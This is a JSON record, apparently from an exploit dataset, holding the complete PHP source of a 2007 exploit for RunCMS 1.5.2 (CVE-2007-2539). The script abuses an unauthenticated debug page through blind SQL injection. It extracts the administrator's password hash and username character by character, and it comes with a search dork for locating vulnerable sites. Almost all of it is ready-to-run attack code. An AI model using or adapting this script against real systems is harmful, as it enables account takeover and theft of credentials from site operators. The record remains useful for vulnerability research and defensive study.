{
  "id": "3850",
  "title": "RunCMS 1.5.2 - &#039;debug_show.php&#039; SQL Injection",
  "cve": "CVE-2007-2539",
  "vuln_type": "sqli",
  "code": "<?php\r\nprint_r('\r\n--------------------------------------------------------------------------\r\nRunCms <= 1.5.2 /class/debug/debug_show.php sql injection / credentials\r\ndisclosure exploit\r\nby rgod\r\nmail: retrog at alice dot it\r\nsite: http://retrogod.altervista.org\r\n\r\ndork: \"Runcms Copyright\" \"2002 - 2007\" +\"page created\"\r\n---------------------------------------------------------------------------\r\n');\r\n\r\n/*\r\nsoftware site: http://www.runcms.org/modules/news/\r\n\r\nvulnerable code in /class/debug/debug_show.php:\r\n<?php\r\n...\r\n\r\ninclude_once(\"../../mainfile.php\");\r\ninclude_once(\"../../header.php\");\r\n\r\nswitch($_POST['debug_show']) {\r\n  case \"show_files\":\r\n    show_files($_POST['loaded_files']);\r\n    break;\r\n\r\n  case \"show_queries\":\r\n    show_queries($_POST['executed_queries'], $_POST['sorted']);\r\n    break;\r\n}\r\n\r\ninclude_once(\"../../footer.php\");\r\n?>\r\n\r\nno authentication is performed to run show_files() and show_queries()\r\nfunctions, look at this now in /class/debug/debug.php:\r\n\r\n...\r\nfunction show_queries($executed_queries, $sorted=0)\r\n{\r\n   global $db;\r\n\r\n   $executed_queries = unserialize(urldecode($executed_queries));\r\n\r\n   if ($sorted == 1)\r\n   {\r\n      sort($executed_queries);\r\n      $is_sorted = _DBG_SORTEDR;\r\n   }\r\n   else\r\n   {\r\n      array_reverse($executed_queries);\r\n      $is_sorted = _DBG_NSORTEDR;\r\n   }\r\n\r\n   OpenTable();\r\n\r\n   $fulldebug = \"\r\n    <h4>($is_sorted) \"._DBG_QEXECED.\": \".count($executed_queries).\"</h4>\r\n    <table width='100%' cellpadding='3' cellspacing='1'>\";\r\n\r\n   $size = count($executed_queries);\r\n\r\n   for ($i=0; $i<$size; $i++)\r\n   {\r\n      $stime = get_micro_time();\r\n\r\n      $query      = $db->query(\"EXPLAIN \".$executed_queries[$i].\"\");\r\n      $querytime  = (get_micro_time() - $stime);\r\n      $totaltime += $querytime;\r\n\r\n      $fulldebug .= \"<tr>\r\n\t\t\t<td nowrap='nowrap' class='bg2'><b>\"._DBG_QUERY.\": \".($i+1).\"</b></td>\r\n\t\t\t<td colspan='7' class='bg3'>$executed_queries[$i]</td>\r\n\t\t\t</tr><tr>\r\n\t\t\t<td nowrap='nowrap' class='bg2'><b>\"._DBG_TIME.\":</b></td>\r\n\t\t\t<td colspan='7' class='bg3'>\".round($querytime, 4).\" \"._DBG_SECONDS.\"</td>\r\n\t\t\t</tr><tr>\r\n\t\t\t<td nowrap='nowrap' class='bg2'><b>\"._DBG_TABLE.\":</b></td>\r\n\t\t\t<td nowrap='nowrap' class='bg2'><b>\"._DBG_TYPE.\":</b></td>\r\n\t\t\t<td nowrap='nowrap' class='bg2'><b>\"._DBG_POSSKEYS.\":</b></td>\r\n\t\t\t<td nowrap='nowrap' class='bg2'><b>\"._DBG_KEY.\":</b></td>\r\n\t\t\t<td nowrap='nowrap' class='bg2'><b>\"._DBG_KEYLEN.\":</b></td>\r\n                        <td nowrap='nowrap' class='bg2'><b>ref:</b></td>\r\n\t\t\t<td nowrap='nowrap' class='bg2'><b>\"._DBG_ROWS.\":</b></td>\r\n\t\t\t<td nowrap='nowrap' class='bg2'><b>\"._DBG_EXTRA.\":</b></td>\r\n                        </tr>\";\r\n\r\n      while ($result = $db->fetch_array($query))\r\n      {\r\n         $fulldebug .= \" <tr>\r\n\t\t\t<td class='bg3' nowrap='nowrap' {$result['table']}&nbsp;</td>\r\n\t\t\t<td class='bg3' nowrap='nowrap' {$result['type']}&nbsp;</td>\r\n\t\t\t<td class='bg3'>{$result['possible_keys']}&nbsp;</td>\r\n\t\t\t<td class='bg3' nowrap='nowrap' {$result['key']}&nbsp;</td>\r\n\t\t\t<td class='bg3' nowrap='nowrap' {$result['key_len']}&nbsp;</td>\r\n                        <td class='bg3' nowrap='nowrap' {$result['ref']}&nbsp;</td>\r\n\t\t\t<td class='bg3' nowrap='nowrap' {$result['rows']}&nbsp;</td>\r\n\t\t\t<td class='bg3'>{$result['Extra']}&nbsp;</td>\r\n                        </tr>\";\r\n      }\r\n      $fulldebug .= \"<tr>\r\n\t\t\t<td colspan='8' class='bg1'>\"._DBG_CUMULATED.\":\".round($totaltime, 4).\" \"._DBG_SECONDS.\"<hr noshade></td>\r\n\t\t\t</tr>\";\r\n   }\r\n\r\n   $fulldebug .= \"</table>\";\r\n\r\n   echo $fulldebug;\r\n   CloseTable();\r\n}\r\n...\r\n\r\nwe have a nice kind of sql injection here!\r\n\r\nalso show_files function can be used to check the existence of certain files\r\nand retrieve the filesize or if it has been modified and so on...\r\n\r\n\r\n*/\r\n\r\nif ($argc<3) {\r\n    print_r('\r\n---------------------------------------------------------------------------\r\nUsage: php '.$argv[0].' host path OPTIONS\r\nhost:      target server (ip/hostname)\r\npath:      path to runcms\r\n\r\nOptions:\r\n -p[port]:    specify a port other than 80\r\n -P[ip:port]:    \"\"   a proxy\r\n -T[prefix]      \"\"   a table prefix (default: runcms)\r\nExample:\r\nphp '.$argv[0].' localhost /runcms/ ls -la -P1.1.1.1:80\r\nphp '.$argv[0].' localhost /runcms/ ls -la -p81\r\n---------------------------------------------------------------------------\r\n');\r\n    die;\r\n}\r\n\r\nerror_reporting(7);\r\nini_set(\"max_execution_time\",0);\r\nini_set(\"default_socket_timeout\",5);\r\n\r\nfunction quick_dump($string)\r\n{\r\n  $result='';$exa='';$cont=0;\r\n  for ($i=0; $i<=strlen($string)-1; $i++)\r\n  {\r\n   if ((ord($string[$i]) <= 32 ) | (ord($string[$i]) > 126 ))\r\n   {$result.=\"  .\";}\r\n   else\r\n   {$result.=\"  \".$string[$i];}\r\n   if (strlen(dechex(ord($string[$i])))==2)\r\n   {$exa.=\" \".dechex(ord($string[$i]));}\r\n   else\r\n   {$exa.=\" 0\".dechex(ord($string[$i]));}\r\n   $cont++;if ($cont==15) {$cont=0; $result.=\"\\r\\n\"; $exa.=\"\\r\\n\";}\r\n  }\r\n return $exa.\"\\r\\n\".$result;\r\n}\r\n$proxy_regex = '(\\b\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\:\\d{1,5}\\b)';\r\n\r\nfunction send($packet)\r\n{\r\n  global $proxy, $host, $port, $html, $proxy_regex;\r\n  if ($proxy=='') {\r\n    $ock=fsockopen(gethostbyname($host),$port);\r\n    if (!$ock) {\r\n      echo 'No response from '.$host.':'.$port; die;\r\n    }\r\n  }\r\n  else {\r\n\t$c = preg_match($proxy_regex,$proxy);\r\n    if (!$c) {\r\n      echo 'Not a valid proxy...';die;\r\n    }\r\n    $parts=explode(':',$proxy);\r\n    $parts[1]=(int)$parts[1];\r\n    echo \"Connecting to \".$parts[0].\":\".$parts[1].\" proxy...\\r\\n\";\r\n    $ock=fsockopen($parts[0],$parts[1]);\r\n    if (!$ock) {\r\n      echo 'No response from proxy...';die;\r\n\t}\r\n  }\r\n  fputs($ock,$packet);\r\n  if ($proxy=='') {\r\n    $html='';\r\n    while (!feof($ock)) {\r\n      $html.=fgets($ock);\r\n    }\r\n  }\r\n  else {\r\n    $html='';\r\n    while ((!feof($ock)) or (!eregi(chr(0x0d).chr(0x0a).chr(0x0d).chr(0x0a),$html))) {\r\n      $html.=fread($ock,1);\r\n    }\r\n  }\r\n  fclose($ock);\r\n}\r\n\r\n$host=$argv[1];\r\n$path=$argv[2];\r\n$port=80;\r\n$proxy=\"\";\r\n$prefix=\"runcms\";\r\n\r\nfor ($i=3; $i<$argc; $i++){\r\n$temp=$argv[$i][0].$argv[$i][1];\r\nif ($temp==\"-p\")\r\n{\r\n  $port=(int)str_replace(\"-p\",\"\",$argv[$i]);\r\n}\r\nif ($temp==\"-P\")\r\n{\r\n  $proxy=str_replace(\"-P\",\"\",$argv[$i]);\r\n}\r\nif ($temp==\"-T\")\r\n{\r\n  $prefix=str_replace(\"-T\",\"\",$argv[$i]);\r\n}\r\n}\r\nif (($path[0]<>'/') or ($path[strlen($path)-1]<>'/')) {echo 'Error... check the path!'; die;}\r\nif ($proxy=='') {$p=$path;} else {$p='http://'.$host.':'.$port.$path;}\r\n\r\n$md5s[0]=0;//null\r\n$md5s=array_merge($md5s,range(48,57)); //numbers\r\n$md5s=array_merge($md5s,range(97,102));//a-f letters\r\n//print_r(array_values($md5s));\r\necho \"md5 hash -> \";\r\n$j=1;$password=\"\";\r\nwhile (!strstr($password,chr(0))){\r\n    for ($i=0; $i<=255; $i++){\r\n        if (in_array($i,$md5s)){\r\n            $executed_queries=array();\r\n            //original query: EXPLAIN ...\r\n            $executed_queries[0]=\"SELECT null FROM \".$prefix.\"_users WHERE 1=(IF((ASCII(SUBSTRING(pass,\".$j.\",1))=\".$i.\"),1,999999)) AND rank=7 LIMIT 1\";\r\n            $sql=urlencode(serialize($executed_queries));\r\n            $sql=str_replace(\"%22\",\"%2522\",$sql);//you know, urldecode()...\r\n            $data =\"debug_show=show_queries\";\r\n            $data.=\"&executed_queries=\".$sql;\r\n            $data.=\"&sorted=1\";\r\n            $packet =\"POST \".$p.\"class/debug/debug_show.php HTTP/1.0\\r\\n\";\r\n            $packet.=\"Content-Type: application/x-www-form-urlencoded\\r\\n\";\r\n            $packet.=\"User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)\\r\\n\";\r\n            $packet.=\"Host: \".$host.\"\\r\\n\";\r\n            $packet.=\"Content-Length: \".strlen($data).\"\\r\\n\";\r\n            $packet.=\"Pragma: no-cache\\r\\n\";\r\n            $packet.=\"Connection: Close\\r\\n\\r\\n\";\r\n            $packet.=$data;\r\n            send($packet);\r\n            if (eregi(\"_users&nbsp;</td>\",$html)){$password.=chr($i);echo chr($i); sleep(1); break;}\r\n        }\r\n        if ($i==255) {die(\"Exploit failed...\");}\r\n  }\r\n  $j++;\r\n}\r\necho \"\\n\";\r\n\r\necho \"admin username -> \";\r\n$j=1;$admin_user=\"\";\r\nwhile (!strstr($admin_user,chr(0))){\r\n    for ($i=0; $i<=255; $i++){\r\n        $executed_queries=array();\r\n        $executed_queries[0]=\"SELECT null FROM \".$prefix.\"_users WHERE 1=(IF((ASCII(SUBSTRING(uname,\".$j.\",1))=\".$i.\"),1,999999)) AND rank=7 LIMIT 1\";\r\n        $sql=urlencode(serialize($executed_queries));\r\n        $sql=str_replace(\"%22\",\"%2522\",$sql);\r\n        $data =\"debug_show=show_queries\";\r\n        $data.=\"&executed_queries=\".$sql;\r\n        $data.=\"&sorted=1\";\r\n        $packet =\"POST \".$p.\"class/debug/debug_show.php HTTP/1.0\\r\\n\";\r\n        $packet.=\"Content-Type: application/x-www-form-urlencoded\\r\\n\";\r\n        $packet.=\"User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)\\r\\n\";\r\n        $packet.=\"Host: \".$host.\"\\r\\n\";\r\n        $packet.=\"Content-Length: \".strlen($data).\"\\r\\n\";\r\n        $packet.=\"Pragma: no-cache\\r\\n\";\r\n        $packet.=\"Connection: Close\\r\\n\\r\\n\";\r\n        $packet.=$data;\r\n        send($packet);\r\n        if (eregi(\"_users&nbsp;</td>\",$html)){$admin_user.=chr($i);echo chr($i); sleep(1); break;}\r\n    }\r\n    if ($i==255) {die(\"Exploit failed...\");}\r\n    $j++;\r\n}\r\n?>\r\n\r\n# milw0rm.com [2007-05-04]",
  "url": "https://www.exploit-db.com/exploits/3850"
}